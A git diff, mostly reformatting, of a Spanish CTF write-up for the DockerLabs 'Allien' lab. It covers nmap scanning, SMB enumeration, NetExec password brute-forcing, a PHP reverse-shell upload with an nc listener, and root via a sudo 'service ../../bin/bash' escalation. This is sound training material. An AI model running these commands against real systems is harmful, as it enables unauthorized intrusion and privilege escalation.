@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Allien 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Allien ​​
+
+## 🖥️ Writeup - Allien
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `SMB` `Enum4linux` `NetExec` `Brute Force` `FileUpload` `Sudoers` `Service`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip allien.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh allien.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80,139,445 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 19:52 CET
 Nmap scan report for 172.17.0.2
@@ -93,7 +102,7 @@ Tenemos abiertos los puertos `22`, `80`, `139` y `445`
 
 Empezaremos enumerando el puerto `445` (Samba).
 
-# SAMBA
+## SAMBA
 
 Utilizamos la herramienta `enum4linux` para enumerar todo el servicio `Samba`.
 
@@ -102,6 +111,7 @@ enum4linux -a 172.17.0.2
 ```
 
 Info:
+
 ```
 [+] Attempting to map shares on 172.17.0.2
 
@@ -127,9 +137,10 @@ Vamos a realizar un ataque de `fuerza bruta` con `NetExec` para intentar obtener
 
 ```bash
 netexec smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
-``` 
+```
 
 Info:
+
 ```
 SMB         172.17.0.2      445    SAMBASERVER      [*] Unix - Samba (name:SAMBASERVER) (domain:SAMBASERVER) (signing:False) (SMBv1:False)
 
@@ -141,7 +152,7 @@ SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\usuario3:123
 SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\usuario3:monkey1 STATUS_LOGON_FAILURE 
 SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\administrador:monkey1 STATUS_LOGON_FAILURE 
 SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent
-``` 
+```
 
 Encontramos credenciales para el usuario `satriani7` : `50cent`.
 
@@ -151,7 +162,7 @@ Utilizamos dichas credenciales para acceder al share `/backup24`.
 smbclient //172.17.0.2/backup24 -U satriani7 -p
 ```
 
-![alt text](../../images/credentials.png)
+![alt text](../../.gitbook/assets/credentials.png)
 
 Encontramos en el directorio `/Documents/Personal/` dos archivos `.txt` interesantes. Los transferimos a nuestra máquina atacante para leerlos.
 
@@ -194,11 +205,10 @@ Después de una enumeración exhaustiva, no encontramos vías de escalada de pri
 
 Sin embargo, descubrimos que tenemos permisos de escritura sobre el directorio `/var/www/html/`, donde se encuentran los archivos visibles en el puerto `80`, por lo que podemos intentar subir un archivo que nos devuelva una `reverse shell` una vez accedamos a él desde el navegador.
 
-
 ```bash
 cd /var/www/html
 nano shell.php
-``` 
+```
 
 Utilizamos la `php-reverse-shell` de Pentestmonkey en GitHub.
 
@@ -211,6 +221,7 @@ sudo nc -nlvp 4444
 Ahora sí, accedemos a `http://172.17.0.2/shell.php`.
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 41648
@@ -226,28 +237,33 @@ $
 
 Recibimos una `reverse shell` como usuario `www-data`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Comprobamos permisos `sudo` y `SUID`.
 
@@ -256,6 +272,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for www-data on 3007a838b450:
     env_reset, mail_badpass,
@@ -273,6 +290,7 @@ sudo /usr/sbin/service ../../bin/bash
 ```
 
 Info:
+
 ```
 root@3007a838b450:/# whoami
 root
